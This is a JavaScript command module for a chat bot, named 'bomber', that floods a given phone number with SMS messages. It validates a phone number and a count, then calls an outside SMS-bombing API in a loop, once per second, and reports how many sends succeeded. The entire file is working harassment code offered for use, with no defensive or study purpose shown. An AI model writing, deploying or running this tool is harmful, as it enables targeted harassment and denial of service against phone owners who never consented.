const axios = require("axios");

module.exports.config = {
  name: "bomber",
  version: "1.1",
  role: 2,
  author: "saimun sabik",
  description: "SMS Bomber using S4B1K API with strict limit control",
  category: "TOOLS",
  guide: "*bomber -017xxxxxxxx -100",
  countDown: 5
};

module.exports.onStart = async function ({ args, event, api }) {
  if (args.length < 2 || !args[0].startsWith("-") || !args[1].startsWith("-")) {
    return api.sendMessage("Wrong format!\nUse: *bomber -017xxxxxxxx -100", event.threadID, event.messageID);
  }

  const phone = args[0].slice(1);
  const limit = parseInt(args[1].slice(1));

  if (!/^\d{6,15}$/.test(phone)) {
    return api.sendMessage("Invalid phone number format.", event.threadID, event.messageID);
  }

  if (isNaN(limit) || limit < 1) {
    return api.sendMessage("Limit must be a number greater than 0.", event.threadID, event.messageID);
  }

  api.sendMessage(`Sending ${limit} SMS to ${phone}...`, event.threadID, event.messageID);

  let success = 0, fail = 0;
  for (let i = 1; i <= limit; i++) {
    try {
      const res = await axios.get(`https://s4b1k-api-ui-v2.onrender.com/api/smsbomber?phone=${phone}`);
      if (res.data?.success || res.data?.message) success++;
      else fail++;
    } catch {
      fail++;
    }
    await new Promise(r => setTimeout(r, 1000)); // Delay 1 sec
  }

  api.sendMessage(`✅ Done!\nSuccess: ${success}\nFailed: ${fail}`, event.threadID);
};
